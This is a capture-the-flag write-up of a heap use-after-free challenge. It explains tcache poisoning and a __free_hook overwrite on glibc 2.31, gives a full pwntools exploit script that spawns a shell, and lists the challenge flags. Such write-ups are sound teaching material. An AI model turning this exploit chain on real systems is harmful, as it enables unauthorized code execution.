# 3. The Corroded Crown

**Category:** pwn — heap use-after-free → tcache poisoning → `__free_hook` hijack **Protections:** PIE · NX · no canary · glibc 2.31 (pre-safe-linking; malloc hooks still present)

## Approach

A menu-driven "relic forge" (forge / inscribe / inspect / destroy) backed by a global struct array (`{ptr, size, in_use}` per slot). The bug: **neither `inscribe_relic()` nor `inspect_relic()` checked the `in_use` flag**, and `destroy_relic()` freed the pointer without clearing it from the struct — a textbook use-after-free:

```c
forge_relic(idx, size);      // malloc; stores ptr+size; sets in_use=1
destroy_relic(idx);          // free(ptr); in_use=0 - ptr/size left dangling!
inscribe_relic(idx);         // writes into ptr regardless of in_use  -> UAF write
inspect_relic(idx);          // reads from ptr regardless of in_use   -> UAF read
```

**Exploit chain:**

1. **Libc leak.** Allocate one big chunk (large enough to bypass tcache and land in the unsorted bin on free) plus a small neighbor chunk (prevents the big one merging into the top chunk). Free the big chunk, then `inspect` it — its freed `fd` / `bk` pointers are addresses inside `main_arena`, a fixed offset from the libc base for a given build. Determined empirically against the provided `libc.so.6`: `libc_base = leak - 0x1ecbe0`.
2. **Prep a `"/bin/sh"` chunk** — allocated and kept alive for the final trigger.
3. **Tcache poisoning** (glibc 2.31 has no safe-linking, so the freelist `next` pointer is a raw address). Important subtlety: tcache tracks a **count** per size-bin separately from the linked list — you need **two** chunks freed into the same bin (count = 2) before corrupting the head's `next` pointer, or the count hits zero after one `malloc()` and the poisoned pointer never gets consulted:
   * Free chunk C1, then C2 → tcache: `[C2 -> C1]`, count = 2
   * UAF-write C2's `next` field → `&__free_hook`
   * `malloc()` pops C2 (count → 1, head becomes `__free_hook`)
   * `malloc()` again → returns `__free_hook` itself (count → 0)
   * Write `system()`'s address into it
4. **Trigger.** Free the `"/bin/sh"` chunk → `__free_hook(ptr)` fires → `system("/bin/sh")` → shell.

```python
from pwn import *
import struct

FREE_HOOK_OFF = 0x1eee48
SYSTEM_OFF    = 0x52290
LEAK_OFFSET   = 0x1ecbe0

io = remote(HOST, PORT)

def forge(idx, size):     io.sendlineafter(b"> ", b"1"); io.sendlineafter(b"index: ", str(idx)); io.sendlineafter(b"size: ", str(size))
def inscribe(idx, data): io.sendlineafter(b"> ", b"2"); io.sendlineafter(b"index: ", str(idx)); io.sendafter(b"bytes: ", data)
def destroy(idx):        io.sendlineafter(b"> ", b"4"); io.sendlineafter(b"index: ", str(idx))
def inspect(idx, size):
    io.sendlineafter(b"> ", b"3"); io.sendlineafter(b"index: ", str(idx))
    io.recvuntil(b": ")
    return io.recvn(size)

forge(0, 1072); forge(1, 32); destroy(0)
leak = u64(inspect(0, 1072)[:8])
libc_base = leak - LEAK_OFFSET
free_hook = libc_base + FREE_HOOK_OFF
system_addr = libc_base + SYSTEM_OFF

forge(2, 8); inscribe(2, b"/bin/sh\x00")

forge(3, 8); forge(4, 8)
destroy(3); destroy(4)                 # tcache count = 2
inscribe(4, p64(free_hook))            # corrupt head's "next"

forge(5, 8)                            # pop C2
forge(6, 8)                            # pop __free_hook itself
inscribe(6, p64(system_addr))          # *__free_hook = system

destroy(2)                             # free("/bin/sh") -> system("/bin/sh")
io.interactive()
```

## Flag

```
HTB{th3_cr0wn_h45_b33n_p01s0n3d_4f1ccd9ee4d4cea2c662c018bead1f82}
```

---

# 4. Words from the Past

**Category:** pwn (solved independently — flag captured, not analyzed in this write-up series)

Flag naming ("five bytes of precision") suggests a partial/last-few-bytes overwrite technique — commonly used to defeat PIE without a full leak, since the low bits of a page address are unaffected by ASLR.

## Flag

```
HTB{f1v3_byt3s_0f_pr3c1s10n_t0_rul3_th3m_4ll_7b1381df71238b4c4ba496ca74c2e02d}
```
## Author: [Anurag886354](https://github.com/Anurag886354)
